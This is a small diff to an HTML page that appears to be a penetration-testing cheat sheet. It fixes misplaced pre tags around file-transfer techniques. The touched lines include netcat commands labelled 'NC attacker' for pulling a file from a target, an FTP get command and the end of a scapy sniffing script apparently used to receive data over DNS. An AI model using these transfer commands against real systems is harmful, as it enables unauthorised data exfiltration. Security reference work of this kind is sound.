@@ -156,10 +156,8 @@ file_put_contents($path, $data);
 <p><strong>NC attacker</strong></p>
 <pre>
 cat file | nc -l 1234
-<pre>
 target
-
-<pre>nc host_ip 1234 > file</pre>
+nc host_ip 1234 > file</pre>
 
 <p><strong>FTP</strong></p>
 <pre>ftp 127.0.0.1 username password get file exit</pre>
@@ -249,7 +247,7 @@ def process_packet(pkt):
 sniff(iface="eth0", prn=process_packet)
 </pre>
 <p>python3 dns_reciver.py</p>
-</pre></pre>
+
       
     </div>
     
